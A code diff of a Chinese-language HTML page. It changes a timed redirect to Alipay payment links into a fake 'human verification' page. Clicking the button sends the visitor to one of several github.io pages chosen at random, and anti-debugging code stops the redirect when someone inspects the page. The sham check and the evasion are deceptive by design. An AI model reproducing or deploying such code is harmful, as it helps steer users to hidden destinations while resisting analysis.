@@ -2,51 +2,72 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>正在跳转...</title>
+  <title>正在验证...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      background-color: #f5f5f5;
+    body { font-family: sans-serif; text-align: center; margin-top: 100px; background: #f9f9f9; }
+    #verifyBtn {
+      padding: 12px 24px;
+      font-size: 18px;
+      background: #1aad19;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
     }
-    .loader {
-      border: 6px solid #eee;
-      border-top: 6px solid #007bff;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin-top: 20px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    #status { margin-top: 30px; font-size: 16px; color: #555; }
   </style>
 </head>
 <body>
-  <h2>正在为您跳转收款页面，请稍候...</h2>
-  <div class="loader"></div>
+  <h2>请进行人机验证</h2>
+  <button id="verifyBtn">我是人类</button>
+  <div id="status">正在加载验证码模块...</div>
 
   <script>
-    // 你的多个收款链接（替换下面这三条为真实的）
-    const urls = [
-      "https://qr.alipay.com/fkx17625jyaptmgpylbosce",
-      "https://qr.alipay.com/fkx88888888888888888888",
-      "https://qr.alipay.com/fkx99999999999999999999"
-    ];
+    (function () {
+      const urls = [
+        "https://a78521336.github.io/1/",
+        "https://a78521336.github.io/2/",
+        "https://a78521336.github.io/3/"
+      ];
 
-    // 随机选一个
-    const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+      function antiDebug() {
+        const t = 160;
+        const n = new Date();
+        debugger;
+        const e = new Date();
+        if (e - n > t) {
+          document.body.innerHTML = "<h2>检测到非法调试，跳转已终止。</h2>";
+          throw new Error("Debugger detected");
+        }
+      }
 
-    // 3秒后跳转
-    setTimeout(() => {
-      window.location.href = randomUrl;
-    }, 3000);
+      const btn = document.getElementById('verifyBtn');
+      const status = document.getElementById('status');
+
+      btn.addEventListener('click', function () {
+        status.innerText = "验证通过，正在跳转...";
+        btn.disabled = true;
+        btn.innerText = "验证中...";
+        
+        const delay = Math.floor(Math.random() * 2000) + 1000; // 1-3秒延迟
+        setTimeout(function () {
+          try {
+            antiDebug();
+            const target = urls[Math.floor(Math.random() * urls.length)];
+            location.href = target;
+          } catch (e) {
+            console.warn(e);
+          }
+        }, delay);
+      });
+
+      if (!document.hasFocus()) {
+        status.innerText = "请点击页面以继续...";
+        window.addEventListener("focus", () => location.reload());
+        btn.disabled = true;
+      }
+    })();
   </script>
 </body>
 </html>
